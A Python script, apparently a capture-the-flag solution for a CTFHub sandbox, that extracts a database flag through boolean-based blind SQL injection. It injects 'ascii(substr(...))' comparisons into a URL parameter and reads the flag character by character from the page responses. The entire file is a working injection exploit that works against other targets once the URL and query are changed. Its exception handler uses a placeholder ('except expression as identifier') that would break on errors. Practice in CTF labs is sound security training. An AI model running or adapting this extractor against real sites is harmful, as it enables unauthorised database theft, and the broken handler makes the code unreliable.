import requests
import string

url = """http://challenge-7d1dd3a74e682725.sandbox.ctfhub.com:10080/?id=1"""
true_key = """query_success"""
query_sql = """select flag from flag"""

data = {
    'a': 'x',
    'b': 'y'
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43',
}

# cookies = requests.utils.cookiejar_from_dict({'PHPSESSID': 'al9fueke3j06ggu128kjl3aoti'})

chs = string.ascii_lowercase+'{'+string.digits+'-}'+string.ascii_uppercase
guesses = []
for ch in chs:
    guesses.append(ord(ch))

req = requests.session()
flag = ''

for length in range(1,99):
    for guess in guesses:
        curl = f"""{url} and ascii(substr(({query_sql}),{length},1))={guess}"""
        try:
            # result = req.post(url=curl, data=data, headers=headers, cookies=cookies)
            result = req.get(url=curl)
        except expression as identifier:
            continue
        if true_key in str(result.content):
            flag += chr(guess)
            print(flag)
            break
        else:
            pass